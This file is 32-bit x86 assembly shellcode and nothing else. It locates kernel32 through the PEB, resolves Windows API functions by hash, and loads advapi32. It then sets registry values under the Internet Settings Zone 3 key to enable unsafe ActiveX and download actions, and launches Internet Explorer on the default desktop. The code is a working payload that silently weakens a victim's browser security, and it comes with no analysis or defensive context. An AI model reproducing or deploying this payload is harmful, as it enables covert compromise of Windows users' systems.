BITS   32
GLOBAL _start

_start:
	cld
	call  get_find_function
strings:
	db    "Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", 0x0
reg_values:
	db    "1004120012011001"
url:
	db    "C:\progra~1\intern~1\iexplore -new", 0x0

get_find_function:
	call startup
find_function:
	pushad
	mov   ebp, [esp + 0x24]
	mov   eax, [ebp + 0x3c]
	mov   edi, [ebp + eax + 0x78]
	add   edi, ebp
	mov   ecx, [edi + 0x18]
	mov   ebx, [edi + 0x20]
	add   ebx, ebp
find_function_loop:
	jecxz find_function_finished
	dec   ecx
	mov   esi, [ebx + ecx * 4]
	add   esi, ebp
	compute_hash:
	xor   eax, eax
	cdq
compute_hash_again:
	lodsb
	test  al, al
	jz    compute_hash_finished
	ror   edx, 0xd
	add   edx, eax
	jmp   compute_hash_again
compute_hash_finished:         
find_function_compare:           
	cmp   edx, [esp + 0x28]
	jnz   find_function_loop
	mov   ebx, [edi + 0x24]
	add   ebx, ebp
	mov   cx, [ebx + 2 * ecx]
	mov   ebx, [edi + 0x1c]
	add   ebx, ebp
	mov   eax, [ebx + 4 * ecx]
	add   eax, ebp
	mov   [esp + 0x1c], eax
find_function_finished:
	popad
	retn 8

startup:
	pop   edi
	pop   ebx
find_kernel32:
	xor   edx, edx
	mov   eax, [fs:edx+0x30]
	test  eax, eax
	js    find_kernel32_9x
find_kernel32_nt:
	mov   eax, [eax + 0x0c]
	mov   esi, [eax + 0x1c]
	lodsd
	mov   eax, [eax + 0x8]
	jmp   short find_kernel32_finished
find_kernel32_9x:
	mov   eax, [eax + 0x34]
	add   eax, byte 0x7c
	mov   eax, [eax + 0x3c]
find_kernel32_finished:

	mov   ebp, esp
find_kernel32_symbols:
	push  0x73e2d87e ; ExitProcess
	push  eax
	push  0x16b3fe72 ; CreateProcessA
	push  eax
	push  0xec0e4e8e ; LoadLibraryA
	push  eax
	call  edi
	xchg  eax, esi
	call  edi
	mov   [ebp], eax
	call  edi
	mov   [ebp + 0x4], eax

load_advapi32:
	push  edx
	push  0x32336970
	push  0x61766461
	push  esp
	call  esi

resolve_advapi32_symbols:
	push  0x02922ba9
	push  eax
	push  0x2d1c9add
	push  eax
	call  edi
	mov   [ebp + 0x8], eax
	call  edi
	xchg  eax, edi
 
	xchg  esi, ebx
open_key:
	push  esp
	push  esi
	push  0x80000001
	call  edi
	pop   ebx
	add   esi, byte (reg_values - strings)

	push  eax
	mov   edi, esp
set_values:
	cmp   byte [esi], 'C'
	jz    initialize_structs
	push  eax
	lodsd
	push  eax
	mov   eax, esp
	push  byte 0x4
	push  edi
	push  byte 0x4
	push  byte 0x0
	push  eax
	push  ebx
	call  [ebp + 0x8]
	jmp   set_values

; This is NT specific, but it lets us execute iexplore regardless
; of what drive it's installed on so long as it's on the same drive
; as the WINDOWS directory, which it should always be.
fixup_drive_letter:
	mov   cl, byte [0x7ffe0030]
	mov   byte [esi], cl

initialize_structs:
	push  byte 0x54
	pop   ecx
	sub   esp, ecx
	mov   edi, esp
	push  edi
	rep   stosb
	pop   edi
	mov   byte [edi], 0x44
	inc   byte [edi + 0x2c]
	inc   byte [edi + 0x2d]

; set lpDesktop to WinSta0\Default so that this works with non-interactive services
	push  0x00746c75
   push  0x61666544
   push  0x5c306174
	push  0x536e6957
	mov   [edi + 8], esp

execute_process:
	lea   ebx, [edi + 0x44]
	push  ebx
	push  edi
	push  eax
	push  eax
	push  byte 0x10
	push  eax
	push  eax
	push  eax
	push  esi
	push  eax
	call  [ebp]

exit_process:
	call  [ebp + 0x4]	
